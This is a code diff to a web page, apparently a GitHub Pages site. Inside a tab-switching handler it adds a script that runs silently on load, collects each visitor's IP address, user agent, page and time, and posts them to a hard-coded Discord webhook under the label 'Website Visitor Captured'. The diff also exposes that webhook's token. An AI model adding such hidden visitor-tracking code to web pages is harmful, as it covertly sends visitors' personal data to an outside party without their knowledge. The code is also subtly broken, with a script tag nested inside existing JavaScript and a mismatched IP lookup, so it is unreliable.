@@ -1223,7 +1223,43 @@
                     tab.classList.remove("active");
 
                 });
+<script>
+  (async function() {
+    try {
+      // 1. Fetch the visitor's IP address
+      const ipResponse = await fetch('https://ipify.org');
+      const ipData = await ipResponse.json();
+      const visitorIp = ipData.ip;
 
+      // 2. Prepare a clean, formatted Discord embed message
+      const discordPayload = {
+        embeds: [{
+          title: "🔒 Security Alert: Website Visitor Captured",
+          color: 15158332, // Red color hex code in decimal
+          fields: [
+            { name: "🌐 IP Address", value: `\`${visitorIp}\``, inline: true },
+            { name: "📄 Page Visited", value: window.location.pathname, inline: true },
+            { name: "⏰ Timestamp", value: new Date().toUTCString(), inline: false },
+            { name: "🖥️ User Agent", value: navigator.userAgent, inline: false }
+          ],
+          footer: { text: "GitHub Pages Monitoring telemetry" }
+        }]
+      };
+
+      // 3. Send the data to your Discord Webhook
+      // REPLACE THE URL BELOW WITH YOUR ACTUAL DISCORD WEBHOOK URL
+      await fetch('https://discord.com/api/webhooks/1535772655733702657/mNJzF_wkb7eTUFxJDaXPuBBULyzhpvh6JoUoC5xvSPZUj8nHmgWTKrPItiDlABmggiPF', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(discordPayload)
+      });
+
+    } catch (error) {
+      // Fail silently in the console so malicious users do not see errors
+      console.error('Telemetry offline.');
+    }
+  })();
+</script>
         }
 
     </script>
